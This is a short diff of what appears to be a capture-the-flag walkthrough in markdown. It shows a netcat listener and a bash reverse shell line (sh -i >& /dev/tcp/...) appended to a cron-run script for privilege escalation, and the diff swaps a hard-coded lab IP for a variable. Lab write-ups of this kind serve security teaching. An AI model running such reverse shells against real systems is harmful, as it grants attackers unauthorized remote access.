@@ -192,7 +192,8 @@ nc -lvnp 1338
 ```
 cat /etc/crontab
 cat /opt/helloworld.sh
-echo "sh -i >& /dev/tcp/10.10.125.248/1338 0>&1" >> /opt/helloworld.sh
+echo '#!/bin/bash' > /opt/helloworld.sh
+echo "sh -i >& /dev/tcp/$KALI/1338 0>&1" >> /opt/helloworld.sh
 ```
 
 <figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
